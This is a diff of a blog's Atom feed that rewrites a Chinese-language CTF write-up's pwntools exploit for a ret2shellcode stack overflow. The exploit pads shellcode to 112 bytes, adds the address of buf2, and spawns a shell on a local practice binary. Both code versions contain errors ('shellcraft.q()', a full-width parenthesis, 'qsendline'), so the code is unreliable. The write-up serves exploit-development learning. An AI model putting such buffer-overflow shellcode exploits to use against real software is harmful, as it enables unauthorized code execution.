@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-07-14T12:38:58.926Z</updated>
+    <updated>2021-07-14T12:43:00.563Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
@@ -82,11 +82,13 @@ cyclic pattern是一个很好用的功能，pattern就是指一个字符串。�
 因此我们可以构造payload<br>
 payload=shellcode.ljust(112,'a')+p32（0x0804A080)<br>
 EXP如下</p>
-<pre><code>from pwn import*
-q=process('./ret2shellcode')
-shellcode =asm(shellcraft.q())
-payload=shellcode.ljust(112,'a')+p32（0x0804A080)
-q.sendline(payload)
+<pre><code>from pwn import *
+
+q = process('./ret2shellcode')
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
+
+qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
 q.interactive()
 </code></pre>
 ]]></content>
